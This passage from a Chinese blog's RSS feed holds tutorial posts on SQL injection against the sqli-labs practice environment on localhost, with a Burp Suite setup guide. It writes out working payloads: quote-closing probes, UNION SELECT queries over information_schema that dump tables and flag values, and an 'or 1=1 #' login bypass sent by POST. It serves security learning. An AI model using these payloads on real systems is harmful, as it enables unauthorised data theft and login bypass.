information_schema.tables where table_schema = database() --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221156300.png&#34; alt=&#34;image-20220929221156300&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;注入步骤-双引号注入&#34;&gt;&lt;a href=&#34;#注入步骤-双引号注入&#34; class=&#34;headerlink&#34; title=&#34;注入步骤(双引号注入)&#34;&gt;&lt;/a&gt;注入步骤(双引号注入)&lt;/h2&gt;&lt;p&gt;Less-4是一道双引号注入的题目。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221450837.png&#34; alt=&#34;image-20220929221450837&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于查看发现是GET请求，因此礼节性地输入id=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221657747.png&#34; alt=&#34;image-20220929221657747&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试注入类型-1&#34;&gt;&lt;a href=&#34;#尝试注入类型-1&#34; class=&#34;headerlink&#34; title=&#34;尝试注入类型&#34;&gt;&lt;/a&gt;尝试注入类型&lt;/h3&gt;&lt;p&gt;输入1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221831821.png&#34; alt=&#34;image-20220929221831821&#34;&gt;&lt;/p&gt;
&lt;p&gt;不报错，怀疑存在双引号注入。&lt;/p&gt;
&lt;p&gt;输入1“  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221918225.png&#34; alt=&#34;image-20220929221918225&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，&lt;code&gt;&amp;quot;1&amp;quot;&amp;quot;) LIMIT 0,1&lt;/code&gt;中，”1””)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型-1&#34;&gt;&lt;a href=&#34;#确定注入类型-1&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型&#34;&gt;&lt;/a&gt;确定注入类型&lt;/h3&gt;&lt;p&gt;我们尝试：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-4&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;quot;) --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功不报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929222215596.png&#34; alt=&#34;image-20220929222215596&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后就可以愉快地&lt;strong&gt;确定列数&lt;/strong&gt; + 使用&lt;strong&gt;联合查询泄露数据库信息&lt;/strong&gt;了。&lt;/p&gt;
&lt;p&gt;小练习&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;通过闭合，确定单引号注入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定列数为3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 4 --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;sql查询失败&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.联合查询泄露数据库信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(table_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;database() &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: emails,flag,users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: challenge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.获取flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, flag, &lt;span class=&#34;keyword&#34;&gt;value&lt;/span&gt;)), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; challenge.flag &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:&lt;span class=&#34;keyword&#34;&gt;any&lt;/span&gt;,flag8:sqlc,flag9:tasi,flag10:moo,flag12:&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;,flag11:muse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: challenge&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，字符型注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/</guid>
            <title>POST注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 21:49:22 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之POST注入&#34;&gt;&lt;a href=&#34;#SQL-注入之POST注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之POST注入&#34;&gt;&lt;/a&gt;SQL 注入之POST注入&lt;/h1&gt;&lt;p&gt;本篇使用POST注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h2&gt;&lt;h3 id=&#34;尝试注入类型&#34;&gt;&lt;a href=&#34;#尝试注入类型&#34; class=&#34;headerlink&#34; title=&#34;尝试注入类型&#34;&gt;&lt;/a&gt;尝试注入类型&lt;/h3&gt;&lt;p&gt;输入1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929203645441.png&#34; alt=&#34;image-20220929203645441&#34;&gt;&lt;/p&gt;
&lt;p&gt;果不其然，此输入框存在SQL注入。且报错信息为&lt;code&gt;use near &amp;#39;&amp;#39;1&amp;#39;&amp;#39; and password=&amp;#39;&amp;#39; LIMIT 0,1&amp;#39; at line 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;提取出错点发生在这一句：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&amp;#x27; and password=&amp;#x27;&amp;#x27; LIMIT 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; LIMIT &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着，查看其F12发现，网页发送的是POST请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204011334.png&#34; alt=&#34;image-20220929204011334&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后通过继续深入查询网页源代码的Elements可以得到，两个&lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;标签对应的变量名，&lt;strong&gt;Username&lt;/strong&gt;对应&lt;strong&gt;uname&lt;/strong&gt;，&lt;strong&gt;Password&lt;/strong&gt;对应&lt;strong&gt;passwd&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204648604.png&#34; alt=&#34;image-20220929204648604&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么就可以构造POST请求：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204929486.png&#34; alt=&#34;image-20220929204929486&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，基本上可以确定，此题存在SQL注入之一——POST注入。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型&#34;&gt;&lt;a href=&#34;#确定注入类型&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型&#34;&gt;&lt;/a&gt;确定注入类型&lt;/h3&gt;&lt;p&gt;输入1’ # 查看是否依旧报错&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不报错，说明是POST单引号注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929205132216.png&#34; alt=&#34;image-20220929205132216&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;是否可以构造非法查询&#34;&gt;&lt;a href=&#34;#是否可以构造非法查询&#34; class=&#34;headerlink&#34; title=&#34;是否可以构造非法查询&#34;&gt;&lt;/a&gt;是否可以构造非法查询&lt;/h3&gt;&lt;p&gt;由于&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; LIMIT &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;username是用单引号括起来的，为了让语法不出错，我们需要&lt;strong&gt;保留单引号&lt;/strong&gt;。即，可以在&lt;code&gt;uname=1&amp;#39; #&amp;amp;passwd=1&lt;/code&gt;的&lt;code&gt;&amp;#39; #&lt;/code&gt;之间&lt;strong&gt;插入我们想要的非法查询语句&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; #&lt;span class=&#34;string&#34;&gt;&amp;#x27; and password = &amp;#x27;&lt;/span&gt;xxx&lt;span class=&#34;string&#34;&gt;&amp;#x27; LIMIT 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造POST请求：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; or 1=1 #&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;登录成功: &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929205718001.png&#34; alt=&#34;image-20220929205718001&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;使用BurpSuit来做Post注入&#34;&gt;&lt;a href=&#34;#使用BurpSuit来做Post注入&#34; class=&#34;headerlink&#34; title=&#34;使用BurpSuit来做Post注入&#34;&gt;&lt;/a&gt;使用BurpSuit来做Post注入&lt;/h2&gt;&lt;p&gt;这里也稍微提及一下BurpSuit抓包工具的简单使用：&lt;/p&gt;
&lt;h3 id=&#34;FireFox浏览器配置&#34;&gt;&lt;a href=&#34;#FireFox浏览器配置&#34; class=&#34;headerlink&#34; title=&#34;FireFox浏览器配置&#34;&gt;&lt;/a&gt;FireFox浏览器配置&lt;/h3&gt;&lt;p&gt;FireFox浏览器中，在”工具栏—选项—高级—连接设置“中，配置手动代理和端口号(127.0.0.1 : &lt;strong&gt;9090&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210357211.png&#34; alt=&#34;image-20220929210357211&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;BurpSuit配置&#34;&gt;&lt;a href=&#34;#BurpSuit配置&#34; class=&#34;headerlink&#34; title=&#34;BurpSuit配置&#34;&gt;&lt;/a&gt;BurpSuit配置&lt;/h3&gt;&lt;p&gt;到BurpSuit里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : &lt;strong&gt;9090&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210527792.png&#34; alt=&#34;image-20220929210527792&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;令BurpSuit拦截到包&#34;&gt;&lt;a href=&#34;#令BurpSuit拦截到包&#34; class=&#34;headerlink&#34; title=&#34;令BurpSuit拦截到包&#34;&gt;&lt;/a&gt;令BurpSuit拦截到包&lt;/h3&gt;&lt;p&gt;点击FireFox的任意提交请求的按钮就可以令BurpSuit拦截到包。以FireFox为例就是，点击了这道题目中的&lt;code&gt;Submit按钮&lt;/code&gt; 或 使用Hackbar的&lt;code&gt;Execute按钮&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210640596.png&#34; alt=&#34;image-20220929210640596&#34;&gt;&lt;/p&gt;
&lt;p&gt;④在内容中鼠标右键点击后选择Send to Reapeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210828967.png&#34; alt=&#34;image-20220929210828967&#34;&gt;&lt;/p&gt;
&lt;p&gt;⑤在Reapter中多次尝试修改注入内容来查看返回的包&lt;/p&gt;
&lt;p&gt;第一次注入尝试&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929211038588.png&#34; alt=&#34;image-20220929211038588&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二次注入尝试&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210956005.png&#34; alt=&#34;image-20220929210956005&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
            <title>整型注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 00:27:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之整型注入&#34;&gt;&lt;a href=&#34;#SQL注入之整型注入&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之整型注入&#34;&gt;&lt;/a&gt;SQL注入之整型注入&lt;/h1&gt;&lt;p&gt;本篇使用整型注入来从0到1进入“SQL注入”的大门。&lt;/p&gt;
&lt;h2 id=&#34;环境准备&#34;&gt;&lt;a href=&#34;#环境准备&#34; class=&#34;headerlink&#34; title=&#34;环境准备&#34;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;当然是先安装phpStudy，然后一键傻瓜式安装后点击启动按钮&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928202842147.png&#34; alt=&#34;image-20220928202842147&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后点击MySQL管理器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203059624.png&#34; alt=&#34;image-20220928203059624&#34;&gt;&lt;/p&gt;
&lt;p&gt;双击localhost，账户名root，密码root即可进入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203206981.png&#34; alt=&#34;image-20220928203206981&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开浏览器，选择sqli&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203903223.png&#34; alt=&#34;image-20220928203903223&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择第一个Setup&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203930840.png&#34; alt=&#34;image-20220928203930840&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现这个界面，即完成了数据库的初始化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203950837.png&#34; alt=&#34;image-20220928203950837&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击后退键回到上一个页面，然后点击Less-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204115026.png&#34; alt=&#34;image-20220928204115026&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现SQLI DUMB SERIES-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204123886.png&#34; alt=&#34;image-20220928204123886&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来以Less-2作为例子进行讲解：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928210728567.png&#34; alt=&#34;image-20220928210728567&#34;&gt;&lt;/p&gt;
